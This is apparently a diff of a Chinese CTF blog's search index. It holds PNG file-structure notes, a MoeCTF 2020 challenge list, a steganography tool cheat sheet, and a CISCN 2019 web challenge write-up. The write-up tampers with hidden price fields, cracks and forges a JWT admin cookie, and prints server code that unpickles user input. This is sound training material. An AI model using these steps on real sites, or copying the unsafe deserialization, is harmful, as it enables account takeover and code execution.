-<p>由于本文很多设计到了PNG在手机方面的应用，因此在此提出MIDP1.0对所使用PNG图片的要求：</p>
-<ul>
-<li>在MIDP1.0中，只可以使用1.0版本的PNG图片。</li>
-<li>文件大小：MIDP支持任意大小的PNG图片，然而实际上，如果一个图片过大，会由于内存耗尽而无法读取。</li>
-<li>颜色类型：所有颜色类型都有被支持，虽然这些颜色的显示依赖于实际设备的显示能力。同时，MIDP也能支持alpha通道，但是，所有的alpha通道信息都会被忽略并且当作不透明的颜色对待。</li>
-<li>色深：所有的色深都能被支持。</li>
-<li>压缩方法：仅支持deflate压缩方式，这和jar文件的压缩方式完全相同，所以，PNG图片数据的解压和jar文件的解压可以使用相同的代码。</li>
-<li>滤波器方法：在PNG中所有的5种方法都被支持。</li>
-<li>隔行扫描：虽然MIDP支持0、1两种方式，然而，当使用隔行扫描时，MIDP却不会真正的使用隔行扫描方式来显示。</li>
-<li>PLTE chunk：支持</li>
-<li>IDAT chunk：图像信息必须使用5种过滤方式中的方式之一 (None, Sub, Up, Average, Paeth)</li>
-<li>IEND chunk：当IEND数据块被找到时，这个PNG图像才认为是合法的PNG图像。</li>
-<li>可选数据块：MIDP可以支持下列辅助数据块，然而，这却不是必须的。</li>
-</ul>
-<p>bKGD cHRM gAMA hIST iCCP iTXt pHYs<br> sBIT sPLT sRGB tEXt tIME tRNS zTXt</p>
-<p><strong>PLTE</strong></p>
-<p>调色板数据块PLTE(palette chunk)包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。</p>
-<p>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成：</p>
-<table>
-<thead>
-<tr>
-<th><strong>颜色</strong></th>
-<th><strong>字节</strong></th>
-<th><strong>意义</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Red</td>
-<td>1 byte</td>
-<td>0 = 黑色, 255 = 红</td>
-</tr>
-<tr>
-<td>Green</td>
-<td>1 byte</td>
-<td>0 = 黑色, 255 = 绿色</td>
-</tr>
-<tr>
-<td>Blue</td>
-<td>1 byte</td>
-<td>0 = 黑色, 255 = 蓝色</td>
-</tr>
-</tbody></table>
-<p>因此，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</p>
-<p>对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p>
-<p>真彩色图像和带alpha通道数据的真彩色图像也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。</p>
-<p><strong>IDAT</strong></p>
-<p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
-<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p>
-<p><strong>IEND</strong></p>
-<p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
-<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
-<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
-<p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p>
-<hr>
-<p><strong>实例研究PNG</strong></p>
-<p>以下是由Fireworks生成的一幅图像，图像大小为8*8，</p>
-<p>为了方便观看，将图像放大：</p>
-<p> 使用UltraEdit32打开该文件，如下：<br><strong>00000000~00000007：</strong></p>
-<p>可以看到，选中的头8个字节即为PNG文件的标识。</p>
-<p>接下来的地方就是IHDR数据块了：</p>
-<p><strong>00000008~00000020：</strong></p>
-<ul>
-<li>00 00 00 0D 说明IHDR头块长为13</li>
-<li>49 48 44 52 IHDR标识</li>
-<li>00 00 00 08 图像的宽，8像素</li>
-<li>00 00 00 08 图像的高，8像素</li>
-<li>04 色深，2^4=16，即这是一个16色的图像（也有可能颜色数不超过16，当然，如果颜色数不超过8，用03表示更合适）</li>
-<li>03 颜色类型，索引图像</li>
-<li>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</li>
-<li>00 同上</li>
-<li>00 非隔行扫描</li>
-<li>36 21 A3 B8 CRC校验</li>
-</ul>
-<p><strong>00000021~0000002F：</strong></p>
-<p>可选数据块sBIT，颜色采样率，RGB都是256（2^8=256）</p>
-<p><strong>00000030~00000062：</strong></p>
-<p>这里是调色板信息</p>
-<ul>
-<li>00 00 00 27 说明调色板数据长为39字节，既13个颜色数</li>
-<li>50 4C 54 45 PLTE标识</li>
-<li>FF FF 00 颜色0</li>
-<li>FF ED 00 颜色1</li>
-<li>…… ……</li>
-<li>09 00 B2 最后一个颜色，12</li>
-<li>5F F5 BB DD CRC校验</li>
-</ul>
-<p><strong>00000063~000000C5：</strong></p>
-<p>这部分包含了pHYs、tExt两种类型的数据块共3块，由于并不太重要，因此也不再详细描述了。</p>
-<p><strong>000000C0~000000F8：</strong></p>
-<p>以上选中部分是IDAT数据块</p>
-<ul>
-<li>00 00 00 27 数据长为39字节</li>
-<li>49 44 41 54 IDAT标识</li>
-<li>78 9C…… 压缩的数据，LZ77派生压缩方法</li>
-<li>DA 12 06 A5 CRC校验</li>
-</ul>
-<p>IDAT中压缩数据部分在后面会有详细的介绍。</p>
-<p><strong>000000F9~00000104：</strong></p>
-<p>IEND数据块，这部分正如上所说，通常都应该是</p>
-<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
-<p>至此，我们已经能够从一个PNG文件中识别出各个数据块了。由于PNG中规定除关键数据块外，其它的辅助数据块都为可选部分，因此，有了这个标准后，我们可以通过删除所有的辅助数据块来减少PNG文件的大小。（当然，需要注意的是，PNG格式可以保存图像中的层、文字等信息，一旦删除了这些辅助数据块后，图像将失去原来的可编辑性。）</p>
-<p>删除了辅助数据块后的PNG文件，现在文件大小为147字节，原文件大小为261字节，文件大小减少后，并不影响图像的内容。</p>
-<ul>
-<li>如上说过，IDAT数据块是使用了LZ77压缩算法生成的，由于受限于手机处理器</li>
-</ul>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> 攻防世界 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MoeCTF 2020 WriteUp</title>
+      <link href="2020/09/28/MoeCTF2020/"/>
+      <url>2020/09/28/MoeCTF2020/</url>
+      
+        <content type="html"><![CDATA[<h1 id="比赛介绍"><a href="#比赛介绍" class="headerlink" title="比赛介绍"></a>比赛介绍</h1><blockquote><p>MoeCTF是西安电子科技大学一年一度的信息安全新生夺旗赛, 由西电信息安全协会面向全体准大学生举办, 题目难度不高且坡度平缓, 比赛平台开设时间很长, 0基础新生可以通过本次比赛对信息安全夺旗赛(CTF)有一个基础且全面的认识, 中学参加过一些CTF比赛的准大学生们也可以通过本次比赛重温CTF赛事.</p><p>MoeCTF除了设有常规CTF比赛相关的分类之外也开设或有计划开设了算法编程类, 运维类, 旨在提供一个知识覆盖全面的做题环境, 同时帮助有过信息学竞赛经历的新生们更快转型.</p></blockquote><a id="more"></a><blockquote><p>MoeCTF的积分方式为最简单的静态积分方式, 选手解题并获取固定的分数, 不设动态积分, 不设一血加成, 选手即使在比赛进行时参赛也不必担心分数差距. 部分题目出题人可能提供题目奖励, 比赛本身无奖项. 比赛结束后平台会继续维护一周供各位选手复盘, 写题解. 西电新生们比赛结束后可能会要求提交题解, 作为西电信息安全协会(XDSEC)2020秋季招新的一个重要砝码. 欢迎大家前来参加比赛, 与各路极客同台竞技, 也欢迎新生们在比赛结束后加入XDSEC, 分享技术, 共同进步!</p><p>西电信息安全协会(XDSEC)是由08, 09级学长自发组建的学生组织, 面向全校各年级同学 ,期间多次与学校合作, 自行管理和发展至今. 协会资源丰富, 在信息安全领域口碑十分优秀. 协会以致力于技术分享与进步为宗旨, 秉承低调, 分享, 专注, 精进, 自由的精神, 旨在为我校热爱信息安全技术的同学建立一个氛围良好的交流平台, 扩大信息安全在我校的影响力.</p></blockquote><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="Re-7"><a href="#Re-7" class="headerlink" title="Re (-7)"></a>Re (-7)</h2><ol><li>逆向工程入门指南（略）</li><li>Welcome To Re</li><li>Thank you Java</li><li>SimpleRe</li><li>Protection</li><li>Real EasyPython</li><li>RollCall</li><li>RxEncode</li></ol><h2 id="Pwn-5"><a href="#Pwn-5" class="headerlink" title="Pwn (-5)"></a>Pwn (-5)</h2><ol><li>Welcome to pwn（略）</li><li>Pwn从入门到入狱（略）</li><li>Baby pwn</li><li>Baby shellcode</li><li>unusual shellcode</li></ol><h2 id="Algorithm-3"><a href="#Algorithm-3" class="headerlink" title="Algorithm (-3)"></a>Algorithm (-3)</h2><ol><li>mess</li><li>Frank，永远滴神</li><li>赤道企鹅，永远滴神</li><li>千层饼</li></ol><h2 id="Crypto-7"><a href="#Crypto-7" class="headerlink" title="Crypto (-7)"></a>Crypto (-7)</h2><ol><li>crypto入门指北（略）</li><li>easycrypto</li><li>rsa_begin</li></ol><h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc (-4)"></a>Misc (-4)</h2><ol><li>Welcome</li><li>MD5</li><li>base64</li><li>hey fxck you！</li><li>base64？¿</li><li>Pseudo Encrypt</li><li>不 会 吧 ？ 就 这 ¿</li><li>Cor1e的支票</li><li>A3FXCK</li><li>⑨的完美算数教室</li><li>停不下来了啊啊啊啊啊啊啊</li><li>星空</li><li>简单的社工题</li></ol><h2 id="Classic-Crypto-fin"><a href="#Classic-Crypto-fin" class="headerlink" title="Classic Crypto (fin)"></a>Classic Crypto (fin)</h2><ol><li>大帝的征程#1</li><li>大帝的征程#2</li><li>外面的世界</li><li>大帝的征程#3</li><li>大帝的征程#维吉尼亚</li><li>大帝的征程#维吉尼亚Ex</li></ol><h2 id="Web-fin"><a href="#Web-fin" class="headerlink" title="Web (fin)"></a>Web (fin)</h2><ol><li>GET</li><li>POST</li><li>小饼干</li><li>Introduction</li><li>一句话</li><li>EzMath</li><li>三心二意</li><li>俄罗斯头套</li><li>Moe include</li><li>Moe unserialize</li><li>EzXXE</li></ol><h2 id="Android-fin"><a href="#Android-fin" class="headerlink" title="Android (fin)"></a>Android (fin)</h2><ol><li>Click It！</li><li>Baby Andriod</li></ol><h2 id="Sign-in（略）-fin"><a href="#Sign-in（略）-fin" class="headerlink" title="Sign in（略）(fin)"></a>Sign in（略）(fin)</h2><h2 id="DevOps-1"><a href="#DevOps-1" class="headerlink" title="DevOps (-1)"></a>DevOps (-1)</h2><h2 id="IoT-1"><a href="#IoT-1" class="headerlink" title="IoT (-1)"></a>IoT (-1)</h2><hr><p><font size=14pt>WP具体内容将在比赛结束后放出</font></p>]]></content>
+      
+      
       <categories>
-        <category>CTF</category>
+          
+          <category> CTF </category>
+          
+          <category> WriteUp </category>
+          
       </categories>
-      <tags>
-        <tag>隐写</tag>
-        <tag>文件结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF中的图片隐写</title>
-    <url>/2020/09/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
-    <content><![CDATA[<ol>
-<li><p>所有图片通用方法</p>
-<ul>
-<li><p>Stegosolve查看是否颜色通道隐写</p>
-</li>
-<li><p>UE查看内嵌字符串</p>
-</li>
-<li><p>Exiftool查看Exif信息</p>
-</li>
-<li><p>strings命令查看字符串，已知flag格式时可尝试搜索flag格式</p>
-</li>
-<li><p>binwalk查看是否有包含其他文件</p>
-</li>
-</ul>
-</li>
-</ol>
-<a id="more"></a>
-
-<ul>
-<li><p>foremost分离包含文件</p>
-</li>
-<li><p>确定有包含其他文件，但foremost分离时卡死，使用dd命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dd</span> <span class="keyword">if</span>=&lt;输入文件名&gt; of=&lt;输出文件名&gt; skip=&lt;输出文件文件块起始地址&gt; bs=1</span><br></pre></td></tr></table></figure></li>
-<li><p>遇到两张几乎一样的图片，考虑叠加或找不同。叠加使用phototshop，找不同使用image_comperer.py</p>
-</li>
-</ul>
-<ol start="2">
-<li><p>png文件</p>
-<ul>
-<li>pngcheck</li>
-<li>修改文件头以改变图片高度、宽度</li>
-<li>zsteg</li>
-</ul>
-</li>
-<li><p>gif文件</p>
-<ul>
-<li>Namo Gif Animator分离帧</li>
-</ul>
-</li>
-<li><p>bmp</p>
-<ul>
-<li><a href=https://github.com/zed-oxff/zsteg>zsteg</a> 需要ruby环境</li>
-</ul>
-</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usage:</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; <span class="string">&#x27;查看LSB信息</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -b 1 -o xy -v &#x27;</span>检测zlib</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; -v  <span class="string">&#x27;显示细节</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -a  &#x27;</span>尝试所有的组合</span><br></pre></td></tr></table></figure>
-
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> MoeCTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTF中的图片隐写</title>
+      <link href="2020/09/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
+      <url>2020/09/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
+      
+        <content type="html"><![CDATA[<ol><li><p>所有图片通用方法</p><ul><li><p>Stegosolve查看是否颜色通道隐写</p></li><li><p>UE查看内嵌字符串</p></li><li><p>Exiftool查看Exif信息</p></li><li><p>strings命令查看字符串，已知flag格式时可尝试搜索flag格式</p></li><li><p>binwalk查看是否有包含其他文件</p></li></ul></li></ol><a id="more"></a><ul><li><p>foremost分离包含文件</p></li><li><p>确定有包含其他文件，但foremost分离时卡死，使用dd命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dd</span> <span class="keyword">if</span>=&lt;输入文件名&gt; of=&lt;输出文件名&gt; skip=&lt;输出文件文件块起始地址&gt; bs=1</span><br></pre></td></tr></table></figure></li><li><p>遇到两张几乎一样的图片，考虑叠加或找不同。叠加使用phototshop，找不同使用image_comperer.py</p></li></ul><ol start="2"><li><p>png文件</p><ul><li>pngcheck</li><li>修改文件头以改变图片高度、宽度</li><li>zsteg</li></ul></li><li><p>gif文件</p><ul><li>Namo Gif Animator分离帧</li></ul></li><li><p>bmp</p><ul><li><a href=https://github.com/zed-oxff/zsteg>zsteg</a> 需要ruby环境</li></ul></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usage:</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; <span class="string">&#x27;查看LSB信息</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -b 1 -o xy -v &#x27;</span>检测zlib</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; -v  <span class="string">&#x27;显示细节</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -a  &#x27;</span>尝试所有的组合</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>CTF</category>
-        <category>做题套路</category>
+          
+          <category> CTF </category>
+          
+          <category> 做题套路 </category>
+          
       </categories>
-      <tags>
-        <tag>隐写</tag>
-        <tag>图片</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CISCN 2019 web_bilibili</title>
-    <url>/2020/09/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_5421_Web_bilibili/</url>
-    <content><![CDATA[<h1 id="CISCN-2019-web-bilibili"><a href="#CISCN-2019-web-bilibili" class="headerlink" title="CISCN 2019 web_bilibili"></a>CISCN 2019 web_bilibili</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3</a></p>
-<h2 id="题目提示"><a href="#题目提示" class="headerlink" title="题目提示"></a>题目提示</h2><p>薅羊毛与逻辑漏洞</p>
-<a id="more"></a>
-
-<h2 id="网站截图"><a href="#网站截图" class="headerlink" title="网站截图"></a>网站截图</h2><p><img src="https://i.loli.net/2020/09/29/hH8jkoWqmZvMy1f.jpg" alt="1.jpg"></p>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
-<li><p>先注册试试看。注册成功后尝试购买了一个账号，成功。</p>
-<p><img src="https://i.loli.net/2020/09/29/8bAeomj5KkdDnW1.png" alt="image-20200807180927483.png"></p>
-</li>
-<li><p>浏览一下网页，发现了这样一句话：一定要买到lv6。突然想到之前ik*n买lv6账号爆睿站的事情。大概翻了几页，没看到lv6。检查元素后发现，每个等级对应的图片名称就是<code>lv</code>+等级+<code>.png</code></p>
-<p><img src="https://i.loli.net/2020/09/29/CUIRvkdMwr52GZs.png" alt="image-20200807181222993.png"></p>
-</li>
-<li><p>python脚本伺候.找到第181页有lv6账号</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">r&#x27;http://220.249.52.133:47045/shop?page=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    req = requests.get(url + str(page))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(<span class="string">&#x27;[+]FOUND!\n[+]At page&#x27;</span>,page)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到一个叫b*sh*的账号.价格真够贵.居然要1145141919,这么臭的价格,真的有买的必要吗?买一下试试,果然操作失败.</p>
-<p><img src="https://i.loli.net/2020/09/29/WhcD5Iy8jq9HdSp.png" alt="image-20200807182130307.png"></p>
-</li>
-<li><p>发现有一个叫折扣的东西,看一下源代码.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;jumbotron&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;shopcar_list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list-group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-group-item&quot;</span>&gt;</span>b*sh* <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span> /</span><br><span class="line">1145141919.0</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>优惠券:-20.0%<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>916113535.2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|632dee6f|b462f5648dfa4b927eeb9581ad057b17|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1624&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1145141919.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;discount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0.8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>结算<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意到其中13-15行居然都是input标签,尝试修改.修改价格失败,修改折扣成功.点击结算后显示页面仅允许admin访问.</p>
-<p><img src="https://i.loli.net/2020/09/29/p1YEPOjqwRyZmG7.png" alt="image-20200807182852209.png"></p>
-</li>
-<li><p>已经登陆账号,再有身份验证就应该和cookies有关了.查看cookies,有一个JWT.</p>
-<p><img src="https://i.loli.net/2020/09/29/PVco83aCzr7suQS.png" alt="image-20200807183041972.png"></p>
-</li>
-</ol>
-<blockquote>
-<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准&lt;a href=<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519r&gt;RFC">https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519r&gt;RFC</a> 7519</a>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
-</blockquote>
-<p>​        搜索JWT后找到了相关工具<a href=https://github.com/brendan-rius/c-jwt-cracker>jwt cracker</a>,破解SHA256，得到密钥1Kun</p>
-<p>​            <img src="https://i.loli.net/2020/09/29/lyZhgSHod3tC7OM.png" alt="image-20200807185740445.png"></p>
-<p>​        在JWT.io生成新的JWT</p>
-<p><img src="https://i.loli.net/2020/09/29/WLFDPoYiymVx8fG.png" alt="image-20200807191017303.png"></p>
-<p>​        修改cookies后刷新。</p>
-<p><img src="https://i.loli.net/2020/09/29/jVE9oqwDz5fNdQG.png" alt="image-20200807191006876.png"></p>
-<p>​        进入到新的界面，然而按钮点击无效。查看源码。</p>
-<p><img src="https://i.loli.net/2020/09/29/yKaz46ChpvxgfQR.png" alt="image-20200807191126831.png"></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span>This is Black Technology!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/b1g_m4mber&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|7d6064a8|aa2f7fa393b7c15560a61f46b348f1d0|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;f-m ui segment&quot;</span> <span class="attr">name</span>=<span class="string">&quot;become&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui secondary button &quot;</span>&gt;</span>一键成为大会员<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>​        绝了，这题做着做着，还有剧情了。<br>​        在网页上检查元素，删掉第14行中的hidden=”hidden”，显示出输入栏<br>​        第3行中有一个压缩文件，下载解压后得到了网站的源码。其中有admin.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
